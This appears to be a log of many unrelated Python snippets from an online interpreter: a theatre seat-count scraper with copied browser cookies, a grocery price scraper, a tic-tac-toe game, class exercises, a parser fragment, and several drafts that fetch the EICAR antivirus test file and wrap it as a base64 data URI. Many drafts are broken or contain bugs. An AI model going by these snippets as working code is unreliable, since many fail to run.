                if "T08:" in showtime or "T09:" in showtime or "T10:" in showtime or "T11:" in showtime or "T12:" in showtime or "T13:" in showtime or "T14:" in showtime or "T15:" in showtime or "T16:" in showtime or "T17:" in showtime:
                    showtimeMAT = "Matinee"

                import requests
                # Seat Plan and count showing sold
                url4 = "https://ticketingservice.harkins.com/api/Theatre/GetSeatPlan/cinemaid/" + str(
                    cinemaid) + "/sessionId/" + str(sessionid)
                querystring4 = {"a": "0"}
                payload4 = ""
                headers4 = {
                    "cookie": "_ga=GA1.2.1591276063.1596145566; WRUIDAWS=2884815583576536; s_ecid=MCMID^%^7C05103073639393802134578813489594990632; __gads=ID=3955cd7d10d5508a:T=1596145571:S=ALNI_MZ3vxKuf3CzeuBbbWPalHUCowGyHw; _cc=AZOY3ZkUTKWdzsz^%^2B^%^2FixEwAn0; help-bubbles=^{^\^tspFiltersOpen^^:1597372774254^}; s_fid=5CAD683F79C77E90-2F6BAB7573070549; adops_master_kvs=; covid-modal-v=^{^\^lastVersion^^:1,^\^viewedOn^^:1618600278296^}; sailthru_visitor=6a8053c3-aac1-44d2-8395-fa462bb897d7; akamai_set_zip=false; expandedSearch=^[^\^mesquite,",
                    "authority": "tickets.fandango.com",
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "accept-language": "en-US,en;q=0.9",
                    "referer": "https://tickets.fandango.com/MobileExpress/Checkout?row_count=362159613&mid=223002&chainCode=REGL&sdate=2022-04-18^%^2015:55&tid=aajjg",
                    "sec-ch-ua": "^\^"
                }
                r4 = requests.request("GET", url4, data=payload4, headers=headers4, params=querystring4)
                data4 = r4.json()
                totshowingseats = data4['data']['numberOfSeats']
                rowcount = data4['data']['rowCount']
                for x4 in range(rowcount):
                    seatcount = len(data4['data']['rows'][x4]['seats'])
                    for x5 in range(seatcount):
                        if data4['data']['rows'][x4]['seats'][x5]['status'] == 1:
                            showingsold = showingsold + 1
                print("   "+showformat+": "+str(showingsold) + "/" + str(totshowingseats)+" ("+showtime+")")
                #Gross calculation
                if showformat == "2D" or showformat == "2DHFR" and showtimeMAT == "Matinee":
                    showinggross = showingsold * MATtwoDprice
                if showformat == "3D" or showformat == "3DHFR" and showtimeMAT == "Matinee":
                    showinggross = showingsold * MATthreeDprice
                if showformat == "Cine1" and showtimeMAT == "Matinee":
                    showinggross = showingsold * MATcine1price
                if showformat == "Cine1XL" and showtimeMAT == "Matinee":
                    showinggross = showingsold * MATcine1XLprice
                if showformat == "Capri" and showtimeMAT == "Matinee":
                    showinggross = showingsold * MATCapriprice
                if showformat == "2D" or showformat == "2DHFR" and showtimeMAT == "NotMatinee":
                    showinggross = showingsold * twoDprice
                if showformat == "3D" or showformat == "3DHFR" and showtimeMAT == "NotMatinee":
                    showinggross = showingsold * threeDprice
                if showformat == "Cine1" and showtimeMAT == "NotMatinee":
                    showinggross = showingsold * cine1price
                if showformat == "Cine1XL" and showtimeMAT == "NotMatinee":
                    showinggross = showingsold * cine1XLprice
                if showformat == "Capri" and showtimeMAT == "NotMatinee":
                    showinggross = showingsold * Capriprice
                if showformat == "IMAX" or showformat == "IMAX3DHFR":
                    showinggross = showingsold * imaxprice

                if showinggross > 0:
                    theagross = theagross + showinggross
                    regiongross = regiongross + showinggross
                    chaingross = chaingross + showinggross

                theasold = theasold + showingsold
                regionsold = regionsold + showingsold
                chainsold = chainsold + showingsold

                if theasold > 0:
                    theaATP = theagross / theasold
                if regionsold > 0:
                    regionATP = regiongross / regionsold
                if chainsold > 0:
                    chainATP = chaingross / chainsold

                theaseats = theaseats + totshowingseats
                regionseats = regionseats + totshowingseats
                chainseats = chainseats + totshowingseats

                theashow = theashow + 1
                regionshow = regionshow + 1
                chainshow = chainshow + 1

        print("   Theater sold: "+str(theasold) + "/" + str(theaseats)+" ("+str(theashow)+" showings)" +" ["+str(theagross)+", "+str(theaATP)+"]")
    print("Region sold: "+str(regionsold) + "/" + str(regionseats)+" ("+str(regionshow)+" showings)" +" ["+str(regiongross)+", "+str(regionATP)+"]")
print("Chain sold: "+str(chainsold) + "/" + str(chainseats)+" ("+str(chainshow)+" showings)" +" ["+str(chaingross)+", "+str(chainATP)+"]")

========================================================================================

                                                    import requests
from bs4 import BeautifulSoup

URL = "https://www.woolworths.com.au/shop/browse/home"

page = requests.get(URL)

soup = BeautifulSoup(page.content, 'html.parser')

products = soup.find_all(class_='shelfProductTile-description')

print("Product Name\tPrice")
print("------------------------")

for product in products:
    name = product.find(class_='shelfProductTile-descriptionLink').text.strip()
    price = product.find(class_='price').text.strip()
    print(f"{name}\t{price}")

========================================================================================

                                                    import random

# Generiraj i ispiši 1000000000 nasumičnih brojeva
for i in range(1000000000):
  number = random.choices(range(37))
  print(number)
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter for Tuncay.")
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter for Tuncay")
========================================================================================

                                                    import segno

price_tag = segno.make ("hello world")
price_tag.save ("hello world.png")
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")
if 5 > 2:
   print("Five is greater than two!")
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")
if 5 > 2:
 print("Five is greater than two!")
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")
if 5 > 2:
print("Five is greater than two!")
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")
if 5 > 2:
  print("Five is greater than two!")
========================================================================================

                                                    
import sys 
import os 
import json 
import time 
import random 
# StringBuilder 
class StringBuilder: 
    _file_str = list() 
    _length = 0 
    @ property 
    def length( self): 
        """ 
        Получава дължината на текущия обект StringBuilder. 
        """ 
        return self._length 
    def __set_length( self): 
        self._length = len( self._file_str) 
    def __getitem__( self, index): 
        # Индексатор на елементите на класа StringBuilder 
        return self._file_str[ index] 
    def __init__( self, init_string: str = None): 
        """ 
            Инициализира нов екземпляр на класа StringBuilder, използвайки посочения низ. 
            Ако не е подаден низ се инициализира празен екземпляр на класа 
        """ 
        if ( init_string == None): 
            self._file_str = list() 
        else: 
            for s in init_string: 
                self._file_str. append( s) 
        self. __set_length() 
    def Append( self, input_string: str = None): 
        """ 
            Добавя низовото представяне на определен обект към този екземпляр. 
        """ 
        for s in input_string: 
            self._file_str. append( s) 
        self. __set_length() 
    def AppendLine( self, input_string: str = None): 
        """ 
            Добавя символ за край на ред или копие на определен низ и символ за край на ред в края на този екземпляр. 
        """ 
        if ( not ( input_string == None)): 
            for s in input_string: 
                self._file_str. append( s) 
        self._file_str. append( " \n ") 
        self. __set_length() 
    def Clear( self): 
        """ 
            Премахва всички символи от текущия екземпляр на StringBuilder. 
        """ 
        self._file_str = [] 
        self. __set_length() 
    def CopyTo( self, sourceIndex: int, destinationIndex: int, count: int, destination: list): 
        """ 
            Копира символите от определен сегмент на този екземпляр в определен сегмент от целевия списък. 
            Параметри: 
            sourceIndex - Началната позиция от която ще бъдат копирани знаците. Нула базиран индекс. 
            destination - Списък в който знаците ще бъдат копирани. 
            destinationIndex - Началната позиция, в destination. Нула базиран индекс. 
            count - Броят на знаците, които трябва да се копират. 
        """ 
        is_valid_index = (( sourceIndex < 0) or ( destinationIndex < 0) or ( count < 0)) 
        is_valid_index = ( 
                    (is_valid_index) or ( sourceIndex >= self.length) or (( sourceIndex + count) >= self.length) or ( 
                    ( destinationIndex + count) >= self.length)) 
        if (is_valid_index): 
            raise IndexError 
        for i in range( sourceIndex + count, sourceIndex - 1, - 1): 
            destination. insert( destinationIndex, self._file_str[ i]) 
    def Insert( self, index, string): 
        """ 
            Вмъква низ в този екземпляр на посочената позиция на символа. 
            Параметри 
            index - Позицията откъдето започва вмъкването. 
            string - Низът за вмъкване. 
        """ 
        if (( len( self._file_str) == 0) and ( index == 0)): 
            self. Append( string) 
            return 
        if ( not (( index >= 0) and ( index < len( self._file_str)))): 
            raise IndexError 
        for i in range( len( string) - 1, - 1, - 1): 
            self._file_str. insert( index, string[ i]) 
        self. __set_length() 
    def Remove( self, startIndex: int, lng: int): 
        """ 
            Премахва посочения диапазон от знаци от този екземпляр. 
            Параметри 
            startIndex - Базирана на нула позиция откъдето започва премахването. 
            lng - Броят знаци за премахване. 
        """ 
        is_valid_index = (( startIndex < 0) or ( lng < 0)) 
        is_valid_index = ( (is_valid_index) or (( startIndex + lng) > self.length)) 
        if (is_valid_index): 
            raise IndexError 
        new_list = self._file_str[: startIndex] + self._file_str[ startIndex + lng:] 
        self._file_str = new_list 
        self. __set_length() 
        return self. __str__() 
    def __str__( self): 
        s = "" 
        for i in range( len( self._file_str)): 
            s = f" { s }{ self._file_str[ i] } " 
        return s 
EMPTY_POSITION = 0 
HUMAN_PLAYER = 1 
AI_PLAYER = 2 
EMPTY_STR = " " 
HUMAN_STR = "O" 
AI_STR = "X" 
SEPARARE_STR = "|" 
RANDOM_AI = 1 
INVINCIBLE_AI = 2 
IS_WIN = 1 
IS_NO_WIN  = 2 
IS_INVALID_MOVE = 3 
IS_SAVE_COMMAND = 4 
IS_EXIT = 5 
OK = 1 
FAULT = 0 
def saveGame( filename, game): 
    #The function saves the current state of the game 
    filePath= filename+ ".txt" 
    stringedGame= str( game) 
    try: 
        if os.path. exists( filePath): 
            raise Exception() 
        else: 
            f = open( filePath, "x") 
            with open( filePath, 'w') as f: 
                f. write( stringedGame) 
    except: 
        print( "Couldn't save the game. Exiting now.") 
    sys. exit() 
def loadGame( filename): 
    #The function loads the saved game 
    filePath = filename + ".txt" 
    try: 
        if os.path. exists( filePath): 
            with open( filePath) as f: 
                return f. readlines() 
        else: 
            raise Exception() 
    except: 
        print( "File with that name hasn't been found!") 
        sys. exit() 
def convertDashBoard( dashBoard): 
    result = [] 
    convertMap = { 
        EMPTY_POSITION: EMPTY_STR, 
        HUMAN_PLAYER: HUMAN_STR, 
        AI_PLAYER: AI_STR 
    } 
    for row in range( len( dashBoard)): 
        tempRow = dashBoard[ row] 
        arr = [] 
        for col in range( len( tempRow)): 
            arr. append( convertMap. get( tempRow[ col])) 
        result. append( arr) 
    return result 
def newBoard(): 
    dashboard = [] 
    for row in range( 3): 
        rowBoard = [] 
        for col in range( 3): 
            rowBoard. append(EMPTY_POSITION) 
        dashboard. append( rowBoard) 
    return dashboard 
def printBoard( dashBoard): 
    sb = StringBuilder() 
    printableDashBoard = convertDashBoard( dashBoard) 
    for row in range( len( printableDashBoard)): 
        sb. AppendLine(SEPARARE_STR. join( printableDashBoard[ row])) 
    print( sb) 
def validMove( row, column, board): 
    is_valid = row >= 0 and row < len( board) 
    is_valid = is_valid and column >= 0 and column < len( board[ row]) 
    is_valid = is_valid and board[ row][ column] == EMPTY_POSITION 
    return is_valid 
def checkWinnerV( turn, board): 
    is_Win = False 
    n = len( board) 
    col = 0 
    while ( not is_Win and col < n): 
        is_CurrentColWin = True 
        row = 0 
        while ( not is_Win and row < n): 
            is_CurrentColWin = is_CurrentColWin and board[ row][ col] == turn 
            row = row + 1 
        is_Win = is_Win or is_CurrentColWin 
        col = col + 1 
    return is_Win 
def checkWinnerH( turn, board): 
    is_Win = False 
    n = len( board) 
    row = 0 
    while ( not is_Win and row < n): 
        is_CurrentRowWin = True 
        col = 0 
        while ( not is_Win and col < n): 
            is_CurrentRowWin = is_CurrentRowWin and board[ row][ col] == turn 
            col = col + 1 
        is_Win = is_Win or is_CurrentRowWin 
        row = row + 1 
    return is_Win 
def checkWinMainDiagonal( turn, board): 
    is_Win = True 
    n = len( board) 
    row = 0 
    while ( row < n): 
        is_Win = is_Win and board[ row][ row] == turn 
        row = row + 1 
    return is_Win 
def checkWinSecondDiagonal( turn, board): 
    is_Win = True 
    n = len( board) 
    row = 0 
    while ( row < n): 
        is_Win = is_Win and board[ row][ n - 1 - row] == turn 
        row = row + 1 
    return is_Win 
def checkWinnerD( turn, board): 
    return checkWinMainDiagonal( turn, board) or checkWinSecondDiagonal( turn, board) 
def checkWinner( turn, board): 
    is_PlayerWin = False 
    is_PlayerWin = is_PlayerWin or checkWinnerV( turn, board) 
    is_PlayerWin = is_PlayerWin or checkWinnerH( turn, board) 
    is_PlayerWin = is_PlayerWin or checkWinnerD( turn, board) 
    return is_PlayerWin 
def checkFull( board): 
    is_Fill = False 
    n = len( board) 
    
    row = 0 
    while ( not is_Fill and row < n): 
        
        col = 0 
        while ( not is_Fill and col < n): 
            is_Fill = board[ row][ col] == EMPTY_POSITION 
            col = col + 1 
        row = row + 1 
    return not is_Fill 
def isGameOver( board): 
    n = len( board) 
    for row in range( n): 
        if isRowFull( row, board) != EMPTY_POSITION: 
            return True 
    
    for col in range( n): 
        if isColFull( col, board) != EMPTY_POSITION: 
            return True 
            
    if isMainDiagonalFull( board) != EMPTY_POSITION: 
        return True 
        
    if isSecondDiagonalFull( board) != EMPTY_POSITION: 
        return True 
        
    return checkFull( board) 
def isRowFull( row, board): 
    c = 0 
    n = len( board) 
    
    symbol = board[ row][ 0] 
    if symbol == EMPTY_POSITION: 
        return EMPTY_POSITION 
        
    result = True 
    while ( c < n): 
        result = result and symbol == board[ row][ c] 
        c = c + 1 
        
    if result: 
        return symbol 
        
    return EMPTY_POSITION 
def isColFull( col, board): 
    r = 0 
    n = len( board) 
    
    symbol = board[ 0][ col] 
    if symbol == EMPTY_POSITION: 
        return EMPTY_POSITION 
        
    result = True 
    while r < n: 
        result = result and symbol == board[ r][ col] 
        r = r + 1 
        
    if result: 
        return symbol 
        
    return EMPTY_POSITION 
def isMainDiagonalFull( board): 
    r = 0 
    n = len( board) 
    symbol = board[ 0][ 0] 
    
    if symbol == EMPTY_POSITION: 
        return EMPTY_POSITION 
        
    result = True 
    while r < n: 
        result = result and symbol == board[ r][ r] 
        r = r + 1 
        
    if result: 
        return symbol 
        
    return EMPTY_POSITION 
    
def isSecondDiagonalFull( board): 
    r = 0 
    n = len( board) 
    
    maxCol = n - 1 
    symbol = board[ 0][ maxCol] 
    
    if symbol == EMPTY_POSITION: 
        return EMPTY_POSITION 
        
    result = True 
    while r < n: 
        result = result and symbol == board[ r][ maxCol - r] 
        r = r + 1 
        
    if result: 
        return symbol 
        
    return EMPTY_POSITION 
def getWinner( board): 
    n = len( board) 
    
    for row in range( n): 
        winner = isRowFull( row, board) 
        
        if winner != EMPTY_POSITION: 
            return winner 
            
    for col in range( n): 
        winner = isColFull( col, board) 
        
        if winner != EMPTY_POSITION: 
            return winner 
            
    winner = isMainDiagonalFull( board) 
    if winner != EMPTY_POSITION: 
        return winner 
        
    winner = isSecondDiagonalFull( board) 
    if winner != EMPTY_POSITION: 
        return winner 
        
    return EMPTY_POSITION 
def computerMove( game): 
    def getEmptyPositions( board): 
        result = [] 
        n = len( board) 
        for row in range( n): 
            for col in range( n): 
                if board[ row][ col] == EMPTY_POSITION: 
                    position = [ row, col] 
                    result. append( position) 
                
        return result 
    def randomPlayer( board, posiblePosition):       
        randomPosition = random.randrange( 0, len( posiblePosition)) 
        board[ posiblePosition[ randomPosition][ 0]][ posiblePosition[ randomPosition][ 1]] = AI_PLAYER 
        return board 
    def invinsiblePlayer( board): 
        def miniMax( board, turn, currentPlayer): 
            if isGameOver( board): 
                winner = getWinner( board) 
                if winner == turn: 
                    return 1 
                    
                if winner == EMPTY_POSITION: 
                    return 0 
                    
                return - 1 
                
            bestValue = 0 
            if currentPlayer == turn: 
                bestValue = -sys.maxsize - 1 
            else: 
                bestValue = sys.maxsize 
                
            options = getEmptyPositions( board) 
            
            for option in options: 
                board[ option[ 0]][ option[ 1]] = currentPlayer 
                printBoard( board) 
                
                newCurrentPlayer = EMPTY_POSITION 
                if currentPlayer == HUMAN_PLAYER: 
                    newCurrentPlayer = AI_PLAYER 
                else: 
                    newCurrentPlayer = HUMAN_PLAYER 
                    
                value = miniMax( board, turn, newCurrentPlayer) 
                board[ option[ 0]][ option[ 1]] = EMPTY_POSITION 
                printBoard( board) 
                if currentPlayer == turn: 
                    bestValue = max( bestValue, value) 
                else: 
                    bestValue = min( bestValue, value)             
            return bestValue 
            
        bestMove = [] 
        bestMoveValue = -sys.maxsize - 1 
        sym = AI_PLAYER 
        
        moves = getEmptyPositions( board) 
        
        for move in moves: 
            currentPlayer = EMPTY_POSITION 
            
            if sym == AI_PLAYER: 
                currentPlayer = HUMAN_PLAYER 
            else: 
                currentPlayer = AI_PLAYER 
                
            board[ move[ 0]][ move[ 1]] = sym 
            #printBoard( board) 
            
            value = miniMax( board, sym, currentPlayer) 
            board[ move[ 0]][ move[ 1]] = EMPTY_POSITION 
            #printBoard( board) 
            if value > bestMoveValue: 
                bestMoveValue = value 
                bestMove = move 
        
        board[ bestMove[ 0]][ bestMove[ 1]] = AI_PLAYER 
        return board 
    t = random.randrange( 2, 5) 
    time. sleep( t) 
    
    if game[ "AI"] == RANDOM_AI: 
        posiblePosition = getEmptyPositions( game[ "board"]) 
        game[ "board"] = randomPlayer( game[ "board"], posiblePosition) 
    else: 
        game[ "board"] = invinsiblePlayer( game[ "board"])     
    
    return game 
def humanMove( game): 
    is_LoopExit = False 
    [ moveRow, moveCol] = [- 1, - 1] 
    while not is_LoopExit: 
        x = input( "Your turn: ") 
        if x. lower() == "s": 
            filename = input( "Enter a file name: ") 
            saveGame( filename, game) 
        if x. count( " ") == 1: 
            [ moveRow, moveCol] = x. split() 
            if str( moveRow). isdigit() and str( moveCol). isdigit(): 
                moveRow = int( moveRow) - 1 
                moveCol = int( moveCol) - 1 
                if validMove( moveRow, moveCol, game[ "board"]): 
                    is_LoopExit = True 
                
        if not is_LoopExit: 
            print( "Nevalid input!") 
                
    return [ moveRow, moveCol] 
def gamePlay( game): 
    is_LoopExit = False 
    result = '' 
    currentTurn = game[ "turn"]     
    while not is_LoopExit: 
        
        printBoard( game[ "board"]) 
        game[ "turn"] = 2 - currentTurn % 2   
        if   currentTurn % 2 == 1: 
            [ moveRow, moveCol] = humanMove( game) 
            dashBoard = game[ "board"] 
            dashBoard[ moveRow][ moveCol] = HUMAN_PLAYER 
            game[ "board"] = dashBoard 
            if checkWinner(HUMAN_PLAYER, dashBoard): 
                result = "You won! Congratulations!" 
                is_LoopExit = True 
        else: 
            print( "Computer is thinking...") 
            game = computerMove( game) 
            dashBoard = game[ "board"] 
            if checkWinner(AI_PLAYER, dashBoard): 
                result = "You lost! Maybe next time..." 
                is_LoopExit = True 
        if not is_LoopExit and checkFull( dashBoard): 
            result = "The game is a draw!" 
            is_LoopExit = True 
        
        currentTurn = currentTurn + 1 
    return result 
def startMenu( game): 
    s = 'Welcome to the game. Choose your option from the listed below: \n ' 
    s = f" { s } Press (n)ew game / (l)oad game" 
    is_LoopExit = False 
    result = 0 
    while not is_LoopExit: 
        print( s) 
        st = input() 
        if st.lower() == 'l': 
            # Зареждане на игра от файл 
            gamePath = input( 'въведете име на файл: ') 
            gameLoad = loadGame( gamePath) 
            if   gameLoad == FAULT: 
                return IS_EXIT 
            game = json. loads( str( gameLoad)) 
        elif st.lower() == 'n': 
            # Нова игра 
            s = "Трудност \n " 
            s = f' { s } 1 - Лесно AI \n ' 
            s = f" { s } 2 - Непобедим AI \n " 
            game[ "board"] = newBoard() 
            game[ "nicknam"] = input( "Въведете никнейм: ") 
            is_Vrong_AI = False 
            while   not is_Vrong_AI: 
                print( s) 
                st = input( "Въведете трудност: ") 
                if st == '1' or st == '2': 
                    game[ "AI"] = int( st) 
                    is_Vrong_AI = True 
        s = "To make a move, enter row and column numbers (from 1 to 3). To save the game, enter `s` for a row." 
        print( s) 
        return gamePlay( game) 
game = { 
    "nicknam": "", 
    "turn": 1, 
    "AI": 1, 
    "board":[] 
} 
result = startMenu( game) 
printBoard( game[ "board"]) 
print( result)

========================================================================================

                                                    def solution(a, m, k):
    count = 0
    last_pos = {}  # value: last position observed
    max_complement_pos = -1
    for head, num in enumerate(a, 1):  # advance head by one
        tail = head - m
        # deletion part is to keep space complexity O(m). 
        # If this is not a concern (likely), safe to omit 
        if tail > 0 and last_pos[a[tail]] <= tail:  # time to pop last element
            del last_pos[a[tail]]
        max_complement_pos = max(max_complement_pos, last_pos.get(k-num, -1))
        count += head >= m and max_complement_pos > tail
        last_pos[num] =head  # add element at head
    return count

a = [5, 2, 10, 8, 9, 8, 2, 6, 2]
m = 4
k = 10
log = solution(a, m, k)
print(log)
========================================================================================

                                                    # Welcome To Python Interpreter
import urllib.request
import urllib.parse
from base64 import b64encode
with urllib.request.urlopen('https://secure.eicar.org/eicar.com') as response:
    data = response.read()
    b64data = b64encode(data).decode('utf-8')
    print(b64data)
========================================================================================

                                                    # Welcome To Python Interpreter
import urllib.request
import urllib.parse
from base64 import b64encode
with urllib.request.urlopen('https://secure.eicar.org/eicar.com') as response:
    data = response.read()
    b64data = b64encode(data)
    print(b64data.decode('utf-8'))
========================================================================================

                                                    # Welcome To Python Interpreter
import urllib.request
import urllib.parse
from base64 import b64encode
with urllib.request.urlopen('https://secure.eicar.org/eicar.com') as response:
    data = response.read()
    b64data = b64encode(data)
    print(b64data)
========================================================================================

                                                    # Welcome To Python Interpreter
import urllib.request
import urllib.parse
from base64 import b64encode
with urllib.request.urlopen('https://secure.eicar.org/eicar.com') as response:
    data = response.read()
    b64data = b64encode(data)
    print(b64data)
    urlencdata = urllib.parse.urlencode(b64data)
    print(f"data:application/octet-stream;base64,{urlencdata}")
========================================================================================

                                                    # Welcome To Python Interpreter
import urllib.request
import urllib.parse
from base64 import b64encode
with urllib.request.urlopen('https://secure.eicar.org/eicar.com') as response:
    data = response.read()
    b64data = b64encode(data)
    urlencdata = urllib.parse.urlencode(b64data)
    print(f"data:application/octet-stream;base64,{urlencdata}")
========================================================================================

                                                    # Welcome To Python Interpreter
import urllib.request
import urllib.parse
from base64 import b64encode
with urllib.request.urlopen('https://secure.eicar.org/eicar.com') as response:
    data = response.read()
    b64data = b64encode(data)
    urlencdata = urllib.parse.urlencode(b64data)
   print(f"data:application/octet-stream;base64,{urlencdata}")
========================================================================================

                                                    # Welcome To Python Interpreter
import urllib.request
import urllib.parse
from base64 import b64encode
with urllib.request.urlopen('https://secure.eicar.org/eicar.com') as response:
   print(f"data:application/octet-stream;base64,{urllib.parse.urlencode(b64encode(response.read()).decode('utf-8'))}")
========================================================================================

                                                    # Welcome To Python Interpreter
import urllib.request
import urllib.parse
from base64 import b64encode
with urllib.request.urlopen('https://secure.eicar.org/eicar.com') as response:
   print(f"data:application/octet-stream;base64,{urllib.parse.urlencode(b64encode(response.read().decode('utf-8')))}")
========================================================================================

                                                    # Welcome To Python Interpreter
import urllib.request
import urllib.parse
from base64 import b64encode
with urllib.request.urlopen('https://secure.eicar.org/eicar.com') as response:
   print(f"data:application/octet-stream;base64,{urllib.parse.urlencode(b64encode(response.read()))}")
========================================================================================

                                                    # Welcome To Python Interpreter
import urllib.request
with urllib.request.urlopen('https://secure.eicar.org/eicar.com') as response:
   print(f"data:application/octet-stream;base64,{response.read()}")
========================================================================================

                                                    # Welcome To Python Interpreter
import urllib.request
with urllib.request.urlopen('http://python.org/') as response:
   html = response.read()
print(html)
========================================================================================

                                                    # Welcome To Python Interpreter
import urllib.request
with urllib.request.urlopen('http://python.org/') as response:
   html = response.read()
========================================================================================

                                                    import pandas as pd

x = 2
y = 4
z = x * y
print(z)

========================================================================================

                                                    x = 2
y = 4
z = x * y
print(z)

========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")

x = 12
x * 2
========================================================================================

                                                    import random

# Generate a random number between 1 and 10
secret_num = random.randint(1, 10)

# Prompt the user to guess the number
guess = int(input("Guess the secret number between 1 and 10: "))

# Check if the user's guess is correct
if guess == secret_num:
    print("Congratulations, you guessed the correct number!")
else:
    print("Sorry, that is not the correct number. The correct number was " + str(secret_num) + ".")
    
    
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")import random

# Generate a random number between 1 and 10
secret_num = random.randint(1, 10)

# Prompt the user to guess the number
guess = int(input("Guess the secret number between 1 and 10: "))

# Check if the user's guess is correct
if guess == secret_num:
    print("Congratulations, you guessed the correct number!")
else:
    print("Sorry, that is not the correct number. The correct number was " + str(secret_num) + ".")
    
========================================================================================

                                                    class user:
    usercount=0
    allowuser=['simin','kamal','abbas','shahin']
    creatuser=[]
    def __init__(self,name,family):
        if name not in user.allowuser:
            raise ValueError(f'{self.name} is not to creat user')
        self.username=name
        self.userfamily=family
        user.usercount+=1
        user.creatuser.append(name)
        
    def deleteduser(self):
        print(f'{self.username} is deleted!!')
        user.usercount-=1
        user.creatuser.remove(self.username)
        
        
        
        
print(user.usercount)  
print(user.creatuser)
u1=user('simin','hoseni')
print(user.usercount)  
print(user.creatuser)
u2=user('shahin','kamani')
print(user.usercount)  
print(user.creatuser)
u2.deleteduser()
print(user.usercount)  
print(user.creatuser)

========================================================================================

                                                    class user:
    usercount=0
    allowuser=['simin','kamal','abbas','shahin']
    creatuser=[]
    def __init__(self,name,family):
        if name not in user.allowuser:
            raise ValueError(f'{self.name} is not to creat user')
        self.username=name
        self.userfamily=family
        user.usercount+=1
        user.creatuser.append(name)
        
    def deleteduser(self):
        print(f'{self.username} is deleted!!')
        user.usercount-=1
        user.createduser.remove(self.username)
        
        
        
        
print(user.usercount)  
print(user.creatuser)
u1=user('simin','hoseni')
print(user.usercount)  
print(user.creatuser)
u2=user('shahin','kamani')
print(user.usercount)  
print(user.creatuser)
u2.deleteduser()
print(user.usercount)  
print(user.creatuser)

========================================================================================

                                                    class user:
    usercount=0
    allowuser=['simin','kamal','abbas','shahin']
    creatuser=[]
    def __init__(self,name,family):
        if name not in user.allowuser:
            raise ValueError(f'{self.name} is not to creat user')
        self.username=name
        self.userfamily=family
        user.usercount+=1
        user.creatuser.append(name)
        
        
print(user.usercount)  
print(user.creatuser)
u1=user('simin','hoseni')
print(user.usercount)  
print(user.creatuser)
u2=user('shahin','kamani')
print(user.usercount)  
print(user.creatuser)

========================================================================================

                                                    import requests
import time

def get_btc_price_history(start_time, end_time, time_interval):
    # Timpul curent, în secunde de la epoch
    current_time = int(time.time())

    # Dacă timpul de început nu este specificat, se setează la o zi în urmă
    if start_time is None:
        start_time = current_time - 86400

    # Dacă timpul de sfârșit nu este specificat, se setează la timpul curent
    if end_time is None:
        end_time = current_time

    # Dacă intervalul de timp nu este specificat, se setează la o oră
    if time_interval is None:
        time_interval = 3600

    # Construim URL-ul cererii către API
    api_url = "https://api.coinmarketcap.com/v1/historical/bitcoin/"
    api_url += "?start=%d&end=%d&interval=%d" % (start_time, end_time, time_interval)

    # Trimitem cererea către API
    response = requests.get(api_url)

    # Verificăm dacă am primit o răspuns bun de la API
    if response.status_code != 200:
        return None

    # Extragem istoria prețurilor BTC din răspunsul primit de la API
    btc_history = response.json()["data"]

    return btc_history

# Apelăm funcția pentru a obține o istorie a prețurilor BTC din ultimele 7 zile
btc_history = get_btc_price_history(None, None, 86400)

# Afișăm istoria prețurilor BTC
print(btc_history)

========================================================================================

                                                    # Welcome To Python Interpreter
name = 'dileep' 
print (f"my name is { name}")
========================================================================================

                                                    # Welcome To Python Interpreter
name = dileep 
print (f"my name is { name}")
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")
a = input()
print(a)
========================================================================================

                                                    # -*- coding: utf-8 -*-
"""
Created on Mon Dec 12 21:48:35 2022

@author: Aamir
"""

def append_dot(a):
    jj = a.replace("->", "->.")
    return jj


def compress_name(name: str):
    res = Counter(name)
    comp = ''
    for r in res:
        comp += r + str(res[r])

    return comp


def save_file(final_string, grammar, name):
    directory = os.path.dirname("parsable_strings/" + str(grammar) + "/")
    if not os.path.exists(directory):
        os.makedirs(directory)

    with open("parsable_strings/{0}/{1}.txt".format(grammar, name), 'w') as f:
        f.write(final_string)


def closure(a):
    temp = [a]
    for it in temp:
        jj = it[it.index(".") + 1]
        if jj != len(it) - 1:
            for k in prod:
                if k[0][0] == jj and (append_dot(k)) not in temp:
                    temp.append(append_dot(k))
        else:
            for k in prod:
                if k[0][0] == jj and it not in temp:
                    temp.append(it)

    return temp


def swap(new, pos):
    new = list(new)
    temp = new[pos]
    if pos != len(new):
        new[pos] = new[pos + 1]
        new[pos + 1] = temp
        new1 = "".join(new)
        return new1
    else:
        return "".join(new)


def goto1(x1):
    hh = []
    pos = x1.index(".")
    if pos != len(x1) - 1:
        jj = list(x1)
        kk = swap(jj, pos)
        if kk.index(".") != len(kk) - 1:
            jjj = closure(kk)
            return jjj
        else:
            hh.append(kk)
            return hh
    else:
        return x1


def get_terminals(gram):
    terms = set()
    for p in gram:
        x1 = p.split('->')
        for t in x1[1].strip():
            if not t.isupper() and t != '.' and t != '':
                terms.add(t)

    terms.add('$')

    return terms


def get_non_terminals(gram):
    terms = set()
    for p in gram:
        x1 = p.split('->')
        for t in x1[1].strip():
            if t.isupper():
                terms.add(t)

    return terms


def get_list(graph, state):
    final = []
    for g in graph:
        if int(g.split()[0]) == state:
            final.append(g)

    return final


if __name__ == '_main_':
    result = pyfiglet.figlet_format("LR (0) Parsing", font="epic")
    print(result)

    prod = []
    set_of_items = []
    c = []

    num = int(input("Enter grammar number: "))
    print("\n")

    with open("grammar/" + str(num) + ".txt", 'r') as fp:
        for i in fp.readlines():
            prod.append(i.strip())

    prod.insert(0, "X->.S")
    print("---------------------------------------------------------------")
    print("Augmented Grammar")
    print(prod)

    prod_num = {}
    for i in range(1, len(prod)):
        prod_num[str(prod[i])] = i

    j = closure("X->.S")
    set_of_items.append(j)

    state_numbers = {}
    dfa_prod = {}
    items = 0
    while True:
        if len(set_of_items) == 0:
            break

        jk = set_of_items.pop(0)
        kl = jk
        c.append(jk)
        state_numbers[str(jk)] = items
        items += 1

